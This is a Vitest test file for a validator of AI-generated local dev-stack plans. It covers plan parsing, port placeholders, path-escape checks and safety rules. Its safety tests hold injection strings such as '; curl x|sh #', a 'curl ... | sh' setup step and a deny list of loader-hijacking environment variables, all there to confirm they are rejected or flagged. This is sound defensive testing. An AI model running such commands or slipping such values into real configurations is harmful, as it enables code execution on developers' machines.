import { describe, expect, it } from "vitest";
import { commandFor, parsePlanBlock, planIssues, planWarnings, resolvePlaceholders, validatePlan, type Vars } from "./plan";
import type { StackPlan } from "../types";

const good = {
  services: [
    { name: "frontend", role: "frontend", cwd: "frontend", cmd: ["node_modules/.bin/next", "dev", "-H", "127.0.0.1", "-p", "${port}"], ready: { path: "/", timeoutSec: 240 } },
    { name: "api", role: "api", cwd: "api", cmd: ["${repo}/api/venv/bin/uvicorn", "app:app", "--host", "127.0.0.1"], port: { arg: "--port" }, ready: { path: "/docs" } },
    { name: "qstash", role: "queue", cwd: ".", cmd: ["npx", "--yes", "@upstash/qstash-cli@latest", "dev", "-port=${port}", "-log-port=${port.log}"], extraPorts: ["log"], ready: { path: "/" } },
    { name: "admin", role: "other", cwd: "stripe-admin", cmd: "source x && npm run dev", shell: true, port: { env: "PORT" }, optional: true },
  ],
  setup: [{ name: "modules", cwd: "frontend", cmd: ["cp", "-cR", "${repo}/frontend/node_modules", "node_modules"], skipIf: "node_modules" }],
  env: { frontend: { NEXT_PUBLIC_API_URL: "${url:api}" }, api: { QSTASH_URL: "${url:qstash}", QSTASH_LOG: "${port:qstash.log}" } },
  envFiles: ["frontend/.env.local", "api/.env"],
  notes: ["cors allows localhost only"],
};

const block = (o: unknown) => `here's the plan.\n\`\`\`lambda-stack\n${JSON.stringify(o)}\n\`\`\`\n`;

describe("plan parsing + validation", () => {
  it("accepts a well-formed plan and fills defaults", () => {
    const r = parsePlanBlock(block({ services: [{ name: "web", role: "frontend", cmd: ["x"] }] }));
    expect("plan" in r && r.plan).toMatchObject({ services: [{ name: "web", cwd: "." }], setup: [], env: {}, envFiles: [], notes: [] });
    expect("plan" in parsePlanBlock(block(good))).toBe(true);
  });

  it("takes the last valid block", () => {
    const bad = { services: [] };
    const second = { ...good, notes: ["second"] };
    const r = parsePlanBlock(block(good) + block(second) + block(bad));
    expect("plan" in r && r.plan.notes).toEqual(["second"]);
  });

  it("reports missing / malformed blocks", () => {
    expect(parsePlanBlock("no block")).toEqual({ error: "no lambda-stack block in the reply" });
    expect("error" in parsePlanBlock("```lambda-stack\n{nope\n```")).toBe(true);
  });

  it("gives a port to services that need one", () => {
    const r = validatePlan({ services: [{ name: "a", role: "api", cmd: ["x", "${port}"] }, { name: "b", role: "worker", cmd: ["y"] }, { name: "c", role: "other", cmd: ["z"] }], env: { b: { A: "${url:c}" } } });
    expect("plan" in r && r.plan.services.map((s) => !!s.port)).toEqual([true, false, true]);
  });

  it("rejects paths that leave the repo", () => {
    for (const cwd of ["/etc", "../x", "a/../../b", "~/x"]) {
      const r = validatePlan({ services: [{ name: "a", role: "api", cwd, cmd: ["x"] }] });
      expect("error" in r && r.error).toMatch(/relative path/);
    }
    expect("error" in validatePlan({ ...good, envFiles: ["../.env"] })).toBe(true);
  });

  it("flags hard-coded developer ports and bad references", () => {
    const base: StackPlan = { services: [], setup: [], env: {}, envFiles: [], notes: [] };
    const p = (patch: Partial<StackPlan>) => planIssues({ ...base, ...patch });
    const svc = (cmd: string[]) => [{ name: "api", role: "api" as const, cwd: "api", cmd }];
    expect(p({ services: svc(["uvicorn", "--port", "8000"]) })[0]).toMatch(/hard-coded port 8000/);
    expect(p({ services: svc(["next", "dev", "-p", "3000"]) }).join()).toMatch(/3000/);
    expect(p({ services: svc(["x"]), env: { api: { API: "http://localhost:3000" } } }).join()).toMatch(/hard-coded port 3000/);
    expect(p({ services: svc(["x"]), env: { api: { PORT: "8000" } } }).join()).toMatch(/hard-coded port 8000/);
    expect(p({ services: svc(["x", "${port.log}"]) }).join()).toMatch(/no extra port "log"/);
    expect(p({ services: svc(["x"]), env: { api: { A: "${url:api}" } } }).join()).toMatch(/has no port/);
    expect(p({ services: svc(["x"]), env: { api: { A: "${url:nope}" } } }).join()).toMatch(/unknown service "nope"/);
    expect(p({ services: svc(["x"]), env: { ghost: { A: "1" } } }).join()).toMatch(/unknown service "ghost"/);
    expect(p({ services: [{ name: "a", role: "api", cwd: ".", cmd: "a && b" }] }).join()).toMatch(/needs "shell": true/);
    expect(p({ services: [...svc(["x"]), ...svc(["y"])] }).join()).toMatch(/duplicate service/);
    // a localhost port that isn't the developer's (e.g. local postgres) is fine
    expect(p({ services: svc(["x"]), env: { api: { DATABASE_URL: "postgres://localhost:5432/db" } } })).toEqual([]);
  });
});

describe("placeholders", () => {
  const v: Vars = { repo: "/r", worktree: "/w", ports: { api: { port: 5001 }, qstash: { port: 5002, extra: { log: 5003 } } } };

  it("resolves ports, urls, extras and paths", () => {
    expect(resolvePlaceholders("${url:api}/x", v)).toBe("http://localhost:5001/x");
    expect(resolvePlaceholders("${port}", v, "api")).toBe("5001");
    expect(resolvePlaceholders("-log-port=${port.log}", v, "qstash")).toBe("-log-port=5003");
    expect(resolvePlaceholders("${port:qstash.log}", v)).toBe("5003");
    expect(resolvePlaceholders("${repo}/venv ${worktree}", v)).toBe("/r/venv /w");
    expect(resolvePlaceholders("no placeholders", v)).toBe("no placeholders");
  });

  it("throws on anything unresolvable", () => {
    expect(() => resolvePlaceholders("${nope}", v)).toThrow(/unknown placeholder/);
    expect(() => resolvePlaceholders("${port}", v)).toThrow();
    expect(() => resolvePlaceholders("${port:ghost}", v)).toThrow();
  });

  it("builds argv, appends the port arg, wraps shell lines", () => {
    expect(commandFor({ cmd: ["uvicorn", "--root", "${repo}"], port: { arg: "--port" } }, v, "api", 5001)).toEqual({ file: "uvicorn", args: ["--root", "/r", "--port", "5001"] });
    expect(commandFor({ cmd: "source ${repo}/venv/bin/activate && uvicorn", shell: true, port: { arg: "--port" } }, v, "api", 5001)).toEqual({
      file: "/bin/zsh",
      args: ["-lc", "source /r/venv/bin/activate && uvicorn --port 5001"],
    });
    expect(commandFor({ cmd: ["qstash", "dev"], port: { arg: "-port=" } }, v, "q", 5002)).toEqual({ file: "qstash", args: ["dev", "-port=5002"] });
    expect(() => commandFor({ cmd: "x", shell: true, port: { arg: "; touch /tmp/pwn #" } }, v, "api", 5001)).toThrow(/not a flag/);
  });
});

describe("plan safety", () => {
  const withSvc = (patch: object, env: object = {}) => ({ ...good, services: [{ ...good.services[0], ...patch }, ...good.services.slice(1)], env: { ...good.env, ...env } });

  it("rejects a port.arg that isn't a bare flag", () => {
    expect("error" in validatePlan(withSvc({ port: { arg: "; curl x|sh #" } }))).toBe(true);
    expect("plan" in validatePlan(withSvc({ port: { arg: "--port" } }))).toBe(true);
  });

  it("rejects plan env keys that change how programs load", () => {
    for (const k of ["NODE_OPTIONS", "DYLD_INSERT_LIBRARIES", "PYTHONPATH", "PATH", "BASH_ENV", "ZDOTDIR", "npm_config_script_shell", "HOME"]) {
      const r = validatePlan(withSvc({}, { frontend: { NEXT_PUBLIC_API_URL: "${url:api}", [k]: "x" } }));
      expect("error" in r ? r.error : "", k).toMatch(/not allowed/);
    }
    expect("plan" in validatePlan(withSvc({}, { api: { PYTHONUNBUFFERED: "1", QSTASH_URL: "${url:qstash}" } }))).toBe(true);
  });

  it("warns about outside executables, fetchers, inline code and qstash on every interface", () => {
    const p = validatePlan({
      ...good,
      setup: [...good.setup, { name: "fetch", cwd: ".", cmd: "curl -s https://x.sh | sh", shell: true }],
      services: [...good.services, { name: "odd", role: "other", cwd: ".", cmd: ["/tmp/bin/thing", "-e", "1"] }, { name: "inline", role: "worker", cwd: ".", cmd: ["node", "-e", "1"] }],
    });
    if (!("plan" in p)) throw new Error(p.error);
    const w = planWarnings(p.plan).join("\n");
    expect(w).toMatch(/service odd runs \/tmp\/bin\/thing/);
    expect(w).toMatch(/setup fetch fetches from the network/);
    expect(w).toMatch(/setup fetch pipes into a shell/);
    expect(w).toMatch(/service inline runs inline code/);
    expect(w).toMatch(/qstash-cli has no host flag/);
    const quiet = validatePlan({ ...good, services: good.services.slice(0, 2), env: { frontend: good.env.frontend } });
    if (!("plan" in quiet)) throw new Error(quiet.error);
    expect(planWarnings(quiet.plan)).toEqual([]);
  });
});
